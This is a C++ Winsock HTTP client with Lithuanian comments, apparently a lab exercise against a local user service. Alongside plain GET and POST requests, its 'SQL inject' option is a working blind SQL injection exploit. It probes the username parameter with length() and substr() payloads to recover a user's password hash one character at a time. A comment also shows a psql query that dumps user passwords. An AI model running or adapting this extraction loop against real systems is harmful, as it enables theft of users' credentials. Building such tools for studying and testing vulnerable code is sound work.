//dockerio komanda paziureti duomenu bazej kokie entries
//docker compose exec database psql -U docker -d myapp -c "SELECT user_id, user_name, user_fname, user_lname, password FROM users;"

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#include <iostream>
#include <sstream>
#include <string>
#include <limits>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

void PrintWsaError(const char* operation)
{
    //cerr kaip cout tik errorams
    //WSAgetlasterror grazina paskutine klaida, kuri ivyko su winsock funkcija
    cerr << operation << " failed. WSA error: " << WSAGetLastError() << endl;
}

bool SendAll(SOCKET sock, const string& data)
{
    int totalSent = 0;
    const int size = static_cast<int>(data.size());

    //reik whilo, kad skaiciuoti kiek issiuntem, kad issiusti visa data, nes gali atsitikti taip, kad i viena requesta netilps visa data
    while (totalSent < size)
    {
        //siusk i sock (id prisijungimo), data.c_str() + totalSent (nurodo nuo kurio simbolio siusti), size - totalSent (kiek liko siusti), 0 (flags)
        int sent = send(sock, data.c_str() + totalSent, size - totalSent, 0);
        if (sent == SOCKET_ERROR)
        {
            PrintWsaError("send");
            return false;
        }
        if (sent == 0)
        {
            cerr << "Connection closed while sending request." << endl;
            return false;
        }
        totalSent += sent;
    }

    return true;
}

bool ReceiveAll(SOCKET sock, string& response)
{
    char buffer[4096];
    //lygiai tas pats, kaip su sendAll ne visada i viena responsa tilps viskas tai apsidraudziam
    while (true)
    {
        //is socketo, i buferi, kiek nuskaityti, 0 (flags)
        int received = recv(sock, buffer, sizeof(buffer), 0);
        if (received == SOCKET_ERROR)
        {
            PrintWsaError("recv");
            return false;
        }
        if (received == 0)
        {
            break;
        }
        response.append(buffer, received);
    }
    return true;
}

bool SendHttpRequest(const string& host, const string& port, const string& request, string& response)
{
    addrinfo hints{}; //empty addreso struktura
    hints.ai_family = AF_INET; //priimk tik ipv4
    hints.ai_socktype = SOCK_STREAM; //TCP stream (byte)
	hints.ai_protocol = IPPROTO_TCP; //protocolas TCP

    addrinfo* result = nullptr; //pointeris i addreso struktura, kur bus issaugotas rezultatas is getaddrinfo
    //getaddrinfo - pagal host ir port grazina adresa, sudeda i result struktura, pagal hints sablona
    int rc = getaddrinfo(host.c_str(), port.c_str(), &hints, &result);
    if (rc != 0) //jei getaddrinfo grazina ne 0, tai yra klaida
    {
        cerr << "getaddrinfo failed: " << rc << endl;
        return false;
    }
    //Cia toks kaip connection handle (connectiono ID galima sakyt). Invalid socket - nera socketo ID
	//Sako ziurek, sukurk socketa pagal adresui kuri getaddrinfo grazino (ipv4, tcp stream, tcp protocol)
    SOCKET sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (sock == INVALID_SOCKET)
    {
        PrintWsaError("socket");
        freeaddrinfo(result); //isvalom adreso struktura, memory management
        return false;
    }

    //bandom jungtis prie sukurto socketo, su adreso informacija
    //ptr->ai_addr - adresas (127.0.0.1:8080), ptr->ai_addrlen - adreso dydis
    rc = connect(sock, result->ai_addr, static_cast<int>(result->ai_addrlen));
	freeaddrinfo(result);//bandem prisijungti, galim atlaisvinti adreso struktura
    //dabar jeigu neprisijungem, tai klaida
    if (rc != 0)
    {
        PrintWsaError("connect");
        closesocket(sock);
        return false;
    }

    //siunciam socketu requesta ir gaunam responsa, jeigu abu sitie grazina true, tada ok == true, tada viskas suveike
//jei bent kuri ar SendAll arba ReceiveAll grazina false, tada ok == false, tada yra kaznokiai problema su siuntimu ar gavimu
    bool ok = SendAll(sock, request) && ReceiveAll(sock, response);

    //isjungiam TCP prisijungima (tiek gavima tiek siuntima), jeigu shutdown sufeilina vstk uzdarom socketa, bet printinam klaida
    if (shutdown(sock, SD_BOTH) == SOCKET_ERROR)
    {
        PrintWsaError("shutdown");
    }

    closesocket(sock); //uzdarom socketa
    return ok; //grazinam ar suveike requestas ir gavom response
}

//buildina get requesta
string BuildGetRequest(const string& host, const string& pathWithQuery)
{
    //cia basically stringas i kuri gali rasyti kaip i cout, kad paprasciau butu struktura islaikyti requesto.
    ostringstream req;
    req << "GET " << pathWithQuery << " HTTP/1.1\r\n";
    req << "Host: " << host << "\r\n";
    req << "Connection: close\r\n\r\n"; //uzdaryk connection po to kai issiusi responsa
    return req.str(); //grazina stringo pavidalu viska
}

//buildina post requesta (kartu su jsonbody)
string BuildPostRequest(const string& host, const string& path, const string& jsonBody)
{
    //tas pats kas auksciau
    ostringstream req;
    req << "POST " << path << " HTTP/1.1\r\n";
    req << "Host: " << host << "\r\n";
    req << "Content-Type: application/json\r\n";//Tik nurodom kad siunciam application/json tipo duomenis
    req << "Content-Length: " << jsonBody.size() << "\r\n";//ir dydi (cia http protokolo prikolas kad butina)
    req << "Connection: close\r\n\r\n";
    req << jsonBody;//siunciam body po headeriu
    return req.str();
}

int main()
{
    const string host = "127.0.0.1";
    const string port = "8080";

    WSADATA wsaData{};
    int rc = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (rc != 0)
    {
        cerr << "WSAStartup failed: " << rc << endl;
        return 1;
    }

    cout << "Winsock HTTP client for " << host << ":" << port << endl;

    while (true)
    {
        cout << "\n1 - GET /users?username=<value>" << endl;
        cout << "2 - POST /users" << endl;
        cout << "3 - SQL inject" << endl;
        cout << "Q - Quit" << endl;
        cout << "Choose option: ";

        string option;
        getline(cin, option);

        if (option == "q" || option == "Q")
        {
            break;
        }

        string request;

        if (option == "1")
        {
            string username;
            cout << "username: ";
            getline(cin, username);
            request = BuildGetRequest(host, "/users?username=" + username);

            string response;
            if (!SendHttpRequest(host, port, request, response))
            {
                cerr << "Request failed." << endl;
                continue;
            }

            cout << "\n--- Server response ---\n";
            cout << response << endl;
        }
        else if (option == "2")
        {
            string userName, firstName, lastName, password;
            cout << "user_name: "; getline(cin, userName);
            cout << "user_fname: "; getline(cin, firstName);
            cout << "user_lname: "; getline(cin, lastName);
            cout << "password: "; getline(cin, password);

            string body = "{\"userName\":\"" + userName +
                "\",\"userFName\":\"" + firstName +
                "\",\"userLName\":\"" + lastName +
                "\",\"password\":\"" + password + "\"}";

            request = BuildPostRequest(host, "/users", body);

            string response;
            if (!SendHttpRequest(host, port, request, response))
            {
                cerr << "Request failed." << endl;
                continue;
            }

            cout << "\n--- Server response ---\n";
            cout << response << endl;
        }
        else if (option == "3")
        {
            string username;
            cout << "username: ";
            getline(cin, username);

            int hash_lenght = 1;
            cout << "\n=== Finding password length ===" << endl;
            while (true)
            {
                cout << "Trying length: " << hash_lenght << flush;
                // %27 = ', %28 = (, %29 = ), %3D = =, + = space
                request = BuildGetRequest(host, "/users?username=" + username + "%27+and+length%28password%29%3D+%27" + to_string(hash_lenght));
                string response;

                if (!SendHttpRequest(host, port, request, response))
                {
                    cerr << " (request failed)" << endl;
                    continue;
                }
                if (response.find("User exists") != string::npos)
                {
                    cout << "\nFOUND!" << endl;
                    break;
                }
                else
                {
                    cout << endl;
                    hash_lenght++;
                }
            }

            cout << "\n=== Extracting password hash characters ===" << endl;
            string extractedPassword = "";
            for (int i = 1; i <= hash_lenght; i++)
            {
                bool found = false;
                string chars = "0123456789abcdefghijklmnopqrstuvwxyz";
                cout << "Position " << i << ": ";

                for (char c : chars)
                {
                    // %27 = ', %28 = (, %29 = ), %2C = ,, + = space
                    request = BuildGetRequest(host, "/users?username=" + username + "%27+and+substr%28password%2C" + to_string(i) + "%2C1%29%3D%27" + c);
                    string response;
                    if (!SendHttpRequest(host, port, request, response))
                    {
                        continue;
                    }
                    if (response.find("User exists") != string::npos)
                    {
                        cout << c << " +" << endl;
                        extractedPassword += c;
                        found = true;
                        break;
                    }
                }
                if (!found)
                {
                    cout << "?" << endl;
                    break;
                }
            }

            cout << "\n=== RESULTS ===" << endl;
            cout << "Username: " << username << endl;
            cout << "Password length: " << hash_lenght << endl;
            cout << "Password: " << extractedPassword << endl;
        }
        else
        {
            cerr << "Invalid option." << endl;
            continue;
        }
    }

    WSACleanup();//isvalo socketus
    return 0;
}